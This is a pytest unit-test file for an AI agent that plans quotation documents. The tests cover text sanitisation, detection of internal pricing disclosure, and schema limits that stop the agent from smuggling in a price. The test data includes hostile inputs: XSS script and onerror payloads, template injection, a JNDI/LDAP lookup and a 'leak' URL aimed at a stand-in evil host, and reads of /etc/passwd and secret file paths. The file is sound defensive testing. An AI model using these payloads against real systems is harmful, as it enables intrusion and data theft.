"""Phase 8 unit tests: DocumentPlan sanitisation and Agent 4 boundaries."""

from __future__ import annotations

import pytest

from app.agents.agents import Agent4DocumentPlanAgent, DocumentPlanRequest
from app.agents.config import load_agent_config
from app.agents.contracts import ErrorCategory
from app.agents.providers import MockProvider
from app.agents.schemas import Agent4DocumentPlanResponse
from app.documents.plan import (
    ALLOWED_CHART_IDS,
    DEFAULT_SECTION_IDS,
    DOCUMENT_PLAN_VERSION,
    build_document_plan,
    contains_internal_disclosure,
    deterministic_document_plan,
    plan_text_values,
    sanitize_plan_text,
)


def _agent_env(**overrides: str) -> dict[str, str]:
    return {f"AGENT4_{key}": value for key, value in overrides.items()}


def _full_sections(**extra):
    payload = {
        "sections": [
            {"section_id": section_id, "heading": section_id.title(), "narrative": ""}
            for section_id in DEFAULT_SECTION_IDS
        ],
        "customer_safe_summary": "",
    }
    payload.update(extra)
    return payload


# -- sanitisation -----------------------------------------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "<script>alert('x')</script>Thank you",
        "Thank you<img src=x onerror=alert(1)>",
        "{{ 7*7 }} thank you",
        "{% for x in y %}thank you{% endfor %}",
        "${jndi:ldap://evil.invalid/a} thank you",
        "See https://evil.invalid/leak thank you",
        "Open file:///etc/passwd thank you",
        "Read /etc/passwd/secret thank you",
        "Read C:\\Users\\secret\\file.xlsx thank you",
        "Read \\\\server\\share\\secret thank you",
        "&lt;script&gt; thank you",
    ],
)
def test_hostile_plan_text_is_stripped_not_escaped(hostile):
    cleaned = sanitize_plan_text(hostile, max_length=500)
    assert "thank you" in cleaned.casefold()
    for token in ("<", ">", "{{", "{%", "${", "http", "file:", "\\\\", "/etc/"):
        assert token not in cleaned
    assert "script" not in cleaned.casefold() or "alert" not in cleaned.casefold()


def test_sanitisation_truncates_and_normalises_whitespace():
    cleaned = sanitize_plan_text("a" * 100 + "\n\n\n   b   ", max_length=20)
    assert len(cleaned) <= 20


def test_sanitisation_of_none_and_control_characters():
    assert sanitize_plan_text(None, max_length=10) == ""
    assert sanitize_plan_text("a\x00\x07b", max_length=10) == "a b"


@pytest.mark.parametrize(
    "text",
    [
        "Our gross margin on this deal is healthy.",
        "The 35% threshold was met.",
        "Estimated cost per unit is competitive.",
        "Rule id COMM-MARGIN-001 was triggered.",
        "Policy version POL-MARGIN-MVP-001 applies.",
        "See the workbook for the data source cell.",
        "Override justification recorded.",
        "Comparable prices support this level.",
    ],
)
def test_internal_disclosure_is_detected(text):
    assert contains_internal_disclosure(text) is True


def test_customer_safe_text_is_not_flagged():
    assert (
        contains_internal_disclosure(
            "Thank you for your enquiry. This quotation covers the configured "
            "system, its accessories and installation."
        )
        is False
    )


# -- plan construction ------------------------------------------------------


def test_deterministic_plan_covers_every_section():
    plan = deterministic_document_plan()
    assert plan.section_ids == DEFAULT_SECTION_IDS
    assert plan.plan_version == DOCUMENT_PLAN_VERSION
    assert plan.fallback_used is True
    assert plan.ai_generated is False


def test_plan_keeps_customer_safe_agent_text():
    response = Agent4DocumentPlanResponse.model_validate(
        _full_sections(
            cover_subtitle="Prepared for your imaging department",
            executive_summary="This quotation covers a complete system.",
            customer_safe_summary="Installation and training are included.",
            chart_captions=[
                {
                    "chart_id": "category_composition",
                    "caption": "Share of the quotation by item category",
                }
            ],
            layout_recommendation="compact",
        )
    )
    plan = build_document_plan(response, provider="mock", ai_generated=True)
    assert plan.cover_subtitle == "Prepared for your imaging department"
    assert plan.executive_summary.startswith("This quotation covers")
    assert plan.customer_summary.startswith("Installation")
    assert plan.caption("category_composition").startswith("Share of the")
    assert plan.layout == "compact"
    assert plan.ai_generated is True


def test_plan_drops_unsafe_text_field_by_field():
    response = Agent4DocumentPlanResponse.model_validate(
        _full_sections(
            cover_subtitle="Gross margin summary",
            executive_summary="<script>x</script>A complete configured system.",
            customer_safe_summary="Estimated cost is 60000.",
            chart_captions=[
                {"chart_id": "quantity_breakdown", "caption": "Margin by category"}
            ],
        )
    )
    plan = build_document_plan(response, provider="mock", ai_generated=True)
    assert plan.cover_subtitle == ""
    assert "script" not in plan.executive_summary.casefold()
    assert "complete configured system" in plan.executive_summary
    assert plan.customer_summary == ""
    assert plan.caption("quantity_breakdown") == ""


def test_plan_rejects_unknown_chart_and_layout():
    response = Agent4DocumentPlanResponse.model_validate(
        _full_sections(
            chart_captions=[{"chart_id": "margin_chart", "caption": "Nice"}],
            layout_recommendation="full-bleed-marketing",
        )
    )
    plan = build_document_plan(response, provider="mock", ai_generated=True)
    assert plan.chart_captions == {}
    assert plan.layout == "standard"


def test_missing_section_forces_the_deterministic_plan():
    response = Agent4DocumentPlanResponse.model_validate(
        {
            "sections": [
                {"section_id": "cover", "heading": "Cover", "narrative": ""}
            ]
        }
    )
    plan = build_document_plan(response, provider="mock", ai_generated=True)
    assert plan.section_ids == DEFAULT_SECTION_IDS
    assert plan.fallback_used is True


def test_no_plan_falls_back():
    plan = build_document_plan(None, provider="mock")
    assert plan.section_ids == DEFAULT_SECTION_IDS
    assert plan.fallback_used is True


def test_plan_text_values_expose_every_free_text_field():
    plan = deterministic_document_plan(customer_summary="Thanks for your enquiry.")
    values = list(plan_text_values(plan))
    assert "Thanks for your enquiry." in values
    assert len(values) >= len(DEFAULT_SECTION_IDS)


# -- agent boundary ---------------------------------------------------------


def _request() -> DocumentPlanRequest:
    return DocumentPlanRequest(
        section_ids=DEFAULT_SECTION_IDS,
        allowed_chart_ids=ALLOWED_CHART_IDS,
    )


def test_agent4_runs_deterministically_without_a_provider():
    outcome = Agent4DocumentPlanAgent(config=load_agent_config("agent4", {})).run(
        _request()
    )
    assert outcome.fallback_used is False
    assert [section.section_id for section in outcome.value.sections] == list(
        DEFAULT_SECTION_IDS
    )


def test_agent4_cannot_smuggle_a_price_through_the_schema():
    provider = MockProvider(
        {"plan_document": _full_sections(total_price="1.00", approval_status="approved")}
    )
    outcome = Agent4DocumentPlanAgent(
        config=load_agent_config("agent4", _agent_env(PROVIDER="mock")),
        provider=provider,
    ).run(_request())
    assert outcome.fallback_used is True
    assert outcome.audit.error_category is ErrorCategory.SCHEMA_VALIDATION


def test_agent4_unknown_chart_id_is_a_business_rule_violation():
    provider = MockProvider(
        {
            "plan_document": _full_sections(
                chart_captions=[{"chart_id": "margin_chart", "caption": "Margins"}]
            )
        }
    )
    outcome = Agent4DocumentPlanAgent(
        config=load_agent_config("agent4", _agent_env(PROVIDER="mock")),
        provider=provider,
    ).run(_request())
    assert outcome.fallback_used is True
    assert outcome.audit.error_category is ErrorCategory.BUSINESS_RULE
